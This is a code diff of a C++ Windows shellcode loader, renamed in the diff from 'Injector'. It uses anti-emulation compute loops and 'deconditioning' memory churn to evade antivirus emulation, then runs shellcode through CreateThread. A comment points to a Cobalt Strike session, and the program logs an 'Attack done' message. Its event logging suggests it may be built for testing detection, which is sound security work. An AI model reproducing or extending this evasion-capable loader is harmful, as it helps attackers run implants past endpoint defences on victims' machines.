@@ -46,17 +46,6 @@ int main(int argc, char** argv) {
     // antiEmulation should be one of the first actions in the EXE
     // deconditioning depends on anti_emulation + obfuscation (anti-signature)
 #if defined antiEmulation || defined deconditioning
-    /*
-    msg << "Doing anti emulation sleep for 5 sec";
-    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
-    auto start_ae_sleep = std::chrono::high_resolution_clock::now();
-    std::this_thread::sleep_for(std::chrono::seconds(5));
-    auto end_ae_sleep = std::chrono::high_resolution_clock::now();
-    auto ae_sleep_elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end_ae_sleep - start_ae_sleep).count();
-    msg << "Slept for approximately " << ae_sleep_elapsed << " ms";
-    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
-    */
-
     msg << "Doing anti emulation calc operations for about 5 sec";
     print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
     auto start_ae_calc = std::chrono::high_resolution_clock::now();
@@ -85,7 +74,7 @@ int main(int argc, char** argv) {
     }
 
     // print current 
-    msg << "Injector started with PID " << GetCurrentProcessId();
+    msg << "Loader started with PID " << GetCurrentProcessId();
     print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
     Sleep(sleep_between_steps_ms);
 
@@ -125,19 +114,6 @@ int main(int argc, char** argv) {
     print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();
 
 #if defined deconditioning // https://github.com/dobin/SuperMega/blob/main/data/source/antiemulation/sirallocalot.c
-    /*
-    msg << "Doing deconditioning calc operations for about 60 sec";
-    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
-    auto start_decon_calc = std::chrono::high_resolution_clock::now();
-    volatile bool dummy_decon_calc; // do no optimze "calc prime" loop away
-    for (UINT64 n = 2; n <= 90'000'000; ++n) { bool pr = true; for (UINT64 i = 2; i * i <= n; ++i) { if (n % i == 0) { pr = false; break; } } dummy_decon_calc = pr; }
-    auto end_decon_calc = std::chrono::high_resolution_clock::now();
-    auto decon_calc_elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end_decon_calc - start_decon_calc).count();
-    msg << "Calculated for approximately " << decon_calc_elapsed << " ms";
-    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
-    Sleep(sleep_between_steps_ms);
-    */
-
     BYTE nonsense[4096] = {};
     constexpr int rounds = 100;
     int repetitions = 10; // one repetition is about 0.01 sec (with waiting for thread and freeing memory), according to CPU time with Get-Process
@@ -266,42 +242,10 @@ int main(int argc, char** argv) {
         return 1;
     }
 
-    /*
-    msg << "Before reading memory to verify write";
-    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();
-
-    // read written bytes back for verification
-    BYTE verify_buf[sizeof(shellcode)] = { 0 };
-    SIZE_T bytes_read;
-    if (ReadProcessMemory(hProcess, addr, &verify_buf, sizeof(shellcode), &bytes_read)) {
-        bool match = (bytes_read == sizeof(shellcode)) && (memcmp(shellcode, verify_buf, sizeof(shellcode)) == 0);
-        if (match) {
-            msg << "After reading memory to verify write";
-            print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
-            Sleep(sleep_between_steps_ms);
-        }
-        else {
-            msg << "Failed to verify written shellcode";
-            print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
-            VirtualFreeEx(hProcess, addr, 0, MEM_RELEASE);
-            CloseHandle(hProcess);
-            return 1;
-        }
-    }
-    else {
-        msg << "Failed to read back memory for verification: " << GetLastError();
-        print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
-        VirtualFreeEx(hProcess, addr, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return 1;
-    }
-    */
-
     msg << "Before creating thread";
     print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();
 
-	// call create thread
-    // alternative: in current thread: ((void(*)())shellcode)();
+	// call create thread, alternative in current thread: ((void(*)())shellcode)();
     HANDLE hThread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)addr, nullptr, 0, nullptr);
     if (hThread) {
         msg << "After creating thread";
@@ -314,8 +258,8 @@ int main(int argc, char** argv) {
         return 1;
 	}
 
-    // wait for hThread?
-    //CloseHandle(hThread); //?
+    WaitForSingleObject(hThread, INFINITE); // wait until CS exit
+    CloseHandle(hThread);
 
     msg << "Attack done";
     print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
